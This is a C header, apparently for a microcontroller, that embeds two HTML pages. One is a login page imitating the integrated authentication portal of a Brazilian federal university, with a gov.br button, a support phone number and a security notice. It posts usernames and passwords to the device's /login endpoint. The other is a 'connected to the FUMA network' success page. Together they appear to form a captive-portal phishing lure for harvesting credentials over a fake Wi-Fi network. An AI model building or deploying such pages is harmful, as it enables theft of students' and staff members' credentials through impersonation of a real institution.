#ifndef WEBPAGES_H
#define WEBPAGES_H

// Página de login
const char *loginPage = R"rawliteral(
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Autenticação Integrada</title>
  <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
      body {
        font-family: Arial, sans-serif;
        display: flex;
        flex-direction: column;
        height: 100vh;
        overflow: hidden;
      }
      .background {
        background: linear-gradient(to bottom, #e8eef7 0%, #d4e0f0 100%);
        height: 300px;
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        z-index: -1;
      }
      .top-bar {
        background-color: #0066cc;
        height: 8px;
        width: 100%;
      }
      .header {
        background-color: white;
        padding: 10px 20px;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 60px;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
      }
      .header img {
        width: 60px;
        height: 60px;
        margin-right: 15px;
      }
      .header h1 {
        color: #333;
        font-size: 18px;
        font-weight: bold;
        letter-spacing: 0.5px;
      }
      .main-content {
        flex: 1;
        display: flex;
        justify-content: center;
        align-items: center;
        padding: 20px;
        position: relative;
        min-height: 0;
      }
      .login-container {
        background: white;
        border-radius: 8px;
        padding: 30px;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
        width: 100%;
        max-width: 400px;
        position: relative;
      }
      .login-title {
        text-align: center;
        color: #a8b8d0;
        font-size: 14px;
        font-weight: normal;
        letter-spacing: 2px;
        margin-bottom: 30px;
        text-transform: uppercase;
      }
      .form-group {
        margin-bottom: 20px;
      }
      .form-group label {
        display: block;
        color: #333;
        font-size: 14px;
        margin-bottom: 8px;
        font-weight: normal;
      }

      .form-group input {
        width: 100%;
        padding: 12px;
        border: 1px solid #ddd;
        border-radius: 4px;
        font-size: 14px;
        color: #666;
        font-style: normal;
      }

      .form-group input::placeholder{
        font-style: italic;
      }

      .form-group input:focus {
        outline: none;
        border-color: #000000;
      }
      .btn-primary {
        width: 100%;
        background-color: #0066cc;
        color: white;
        border: none;
        padding: 12px;
        border-radius: 25px;
        font-size: 14px;
        font-weight: bold;
        cursor: pointer;
        margin-bottom: 15px;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
      }
      .btn-primary:hover {
        background-color: #0052a3;
      }
      .btn-secondary {
        width: 100%;
        background-color: #2b5cb0;
        color: white;
        border: none;
        padding: 12px;
        border-radius: 25px;
        font-size: 14px;
        font-weight: bold;
        cursor: pointer;
        margin-bottom: 20px;
      }
      .btn-secondary:hover {
        background-color: #1e4080;
      }
      .links {
        text-align: center;
      }
      .links a {
        color: #0066cc;
        text-decoration: none;
        font-size: 13px;
        display: block;
        margin-bottom: 8px;
      }
      .links a:hover {
        text-decoration: underline;
      }
      .warning-box {
        position: absolute;
        right: 20px;
        top: 50%;
        transform: translateY(-50%);
        background-color: #fff3cd;
        border: 1px solid #ffeaa7;
        border-radius: 4px;
        padding: 15px;
        width: 280px;
        font-size: 12px;
        color: #856404;
        line-height: 1.4;
      }
      .footer {
        background-color: #f8f9fa;
        padding: 15px 20px;
        display: flex;
        align-items: center;
        justify-content: center;
        border-top: 1px solid #e9ecef;
        font-size: 12px;
        color: #666;
        min-height: 80px;
      }
      .footer-left {
        display: flex;
        align-items: center;
      }
      .footer img {
        width: 80px;
        height: auto;
        margin-right: 15px;
      }
      .lock-icon {
        width: 16px;
        height: 16px;
        fill: currentColor;
      }
      @media (max-width: 768px) {
        .warning-box {
          position: static;
          transform: none;
          margin-top: 20px;
          width: 100%;
          max-width: 400px;
        }
        .main-content {
          flex-direction: column;
          align-items: center;
        }
        .header h1 {
          font-size: 16px;
        }
        .footer {
          flex-direction: column;
          text-align: center;
          gap: 10px;
        }
      }
  </style>
</head>
<body>
  <div class="top-bar"></div>
    <header class="header">
      <!-- <img src="" alt="Brasão FUMA" /> -->
      <h1>FEDERAL UNIVERSIDADE DO MARANHÃO</h1>
    </header>
  <main class="main-content">
    <div class="background"></div>
    <div class="login-container">
      <h2 class="login-title">Autenticação Integrada</h2>
      <form action="/login" method="post" id="loginForm">
        <div class="form-group">
          <label for="email">Nome de usuário:</label>
          <input type="text" id="email" name="email" placeholder="Digite seu login" required />
        </div>
        <div class="form-group">
          <label for="password">Senha:</label>
          <input type="password" id="password" name="pass" placeholder="Digite sua senha" required minlength="8" />
        </div>
        <button type="submit" class="btn-primary">ENTRAR</button>
        <button type="button" class="btn-secondary">Entrar com gov.br</button>
      </form>
      <div class="links">
        <a href="#">Esqueceu a senha?</a>
      </div>
    </div>
    <div class="warning-box">
      Por razões de segurança, por favor deslogue e feche o seu navegador quando terminar de acessar os sistemas que precisam de autenticação!
    </div>
  </main>
  <footer class="footer">
    <div class="footer-left">
      <!-- <img src="" alt="STI Logo" /> -->
    </div>
    <div>
      Superintendêntendência de Tecnologia da Informação | +55 0800 770 7900 | Copyright © 2006 - 2025 FUMA
    </div>
  </footer>
  <script>
    // Envia keepalive a cada 1 segundo para manter o LED piscando
    setInterval(function() {
      fetch('/keepalive').catch(()=>{});
    }, 1000);
  </script>
</body>
</html>
)rawliteral";

// Página de sucesso após login
const char *successPage = R"rawliteral(
<!DOCTYPE html>
<html lang="pt-BR">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Login Efetuado</title>
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
      body {
        font-family: Arial, sans-serif;
        display: flex;
        flex-direction: column;
        min-height: 100vh;
        background: linear-gradient(to bottom, #e8eef7 0%, #d4e0f0 100%);
      }
      .top-bar {
        background-color: #0066cc;
        height: 8px;
        width: 100%;
      }
      .header {
        background-color: white;
        padding: 10px 20px;
        display: flex;
        justify-content: center;
        align-items: center; 
        height: 60px;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
      }
      .header img {
        width: 60px;
        height: 60px;
        margin-right: 15px;
      }
      .header h1 {
        color: #333;
        font-size: 18px;
        font-weight: bold;
        letter-spacing: 0.5px;
      }
      .main-content {
        flex: 1;
        display: flex;
        justify-content: center;
        align-items: center;
        padding: 20px;
      }
      .success-box {
        background: white;
        padding: 40px 30px;
        border-radius: 8px;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
        max-width: 420px;
        width: 100%;
        text-align: center;
      }
      .success-box h2 {
        color: #0066cc;
        margin-bottom: 15px;
        font-size: 22px;
      }
      .success-box p {
        color: #444;
        font-size: 15px;
        margin-bottom: 10px;
      }
      .footer {
        background-color: #f8f9fa;
        padding: 15px 20px;
        display: flex;
        align-items: center;
        justify-content: center;
        border-top: 1px solid #e9ecef;
        font-size: 12px;
        color: #666;
        min-height: 80px;
      }
      .footer-left {
        display: flex;
        align-items: center;
      }
      .footer img {
        width: 80px;
        height: auto;
        margin-right: 15px;
      }
      @media (max-width: 768px) {
        .header h1 {
          font-size: 16px;
        }
        .footer {
          flex-direction: column;
          text-align: center;
          gap: 10px;
        }
      }
    </style>
  </head>
  <body>
    <div class="top-bar"></div>
    <header class="header">
      <!-- <img src="" alt="Brasão FUMA" /> -->
      <h1>FEDERAL UNIVERSIDADE DO MARANHÃO</h1>
    </header>
    <main class="main-content">
      <div class="success-box">
        <h2>Login efetuado com sucesso!</h2>
        <p>Você está conectado à rede <strong>FUMA</strong>.</p>
        <p>Agora você pode fechar esta aba.</p>
      </div>
    </main>
    <footer class="footer">
      <div class="footer-left">
        <!-- <img src="" alt="STI Logo" /> -->
      </div>
      <div>
      Superidisintendência de Tecnologia da Informação | +55 0800 770 7900 | Copyright © 2006 - 2025 FUMA
      </div>
    </footer>
    <script>
      // Envia keepalive a cada 1 segundo para manter o LED piscando
      setInterval(function() {
        fetch('/keepalive').catch(()=>{});
      }, 1000);
    </script>
  </body>
</html>
)rawliteral";

#endif
